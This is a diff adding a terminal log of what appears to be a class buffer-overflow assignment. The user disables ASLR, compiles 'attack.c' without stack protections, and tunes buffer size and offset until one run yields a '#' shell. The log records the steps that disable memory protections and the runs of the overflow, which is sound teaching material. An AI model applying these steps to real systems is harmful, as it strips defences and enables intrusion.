@@ -1,0 +1,71 @@
+Script started on Thu 05 Apr 2018 01:04:51 AM CDT
+root@js-17-81:/class/assignment# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+0
+root@js-17-81:/class/assignment# gcc -z execstack -fno-stack-protector -o attack attack.c
+attack.c:12:1: error: expected ‘,’ or ‘;’ before ‘unsigned’
+ unsigned long get_sp(void) { 
+ ^
+attack.c: In function ‘main’:
+attack.c:24:7: warning: incompatible implicit declaration of built-in function ‘exit’ [enabled by default]
+       exit(0);
+       ^
+attack.c:29:14: warning: incompatible implicit declaration of built-in function ‘malloc’ [enabled by default]
+       buff = malloc(bsize); 
+              ^
+attack.c:30:12: warning: assignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+            ^
+attack.c:32:7: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long int *’ [-Wformat=]
+       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+       ^
+attack.c:38:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+                  ^
+attack.c:42:23: warning: assignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+                       ^
+root@js-17-81:/class/assignment# ./attack
+
+
+Usage is either attack [buffer_size]
+ or attack [buffer_size] [stack_offset]
+root@js-17-81:/class/assignment# ./attack 1056 12000
+
+Using address as guess for beginning of attack buffer: 0xffffaea0
+
+Length of Input String:1054
+
+
+Value of Test:ffffb2a8
+Value of filename[0]:ffffaea0
+
+You are going to need a buffer a little larger than:1032
+
+# exit
+root@js-17-81:/class/assignment# ./attack 1032[K1 12000
+
+Using address as guess for beginning of attack buffer: 0xffffaea0
+
+Length of Input String:1030
+
+
+Value of Test:ffffb2c8
+Value of filename[0]:ffffaec0
+
+You are going to need a buffer a little larger than:1032
+
+root@js-17-81:/class/assignment# ./attack 1061 12000
+
+Using address as guess for beginning of attack buffer: 0xffffaea0
+
+Length of Input String:1060
+
+
+Value of Test:ffffb2a8
+Value of filename[0]:ffffaea0
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+root@js-17-81:/class/assignment# exit
+Script done on Thu 05 Apr 2018 01:08:15 AM CDT
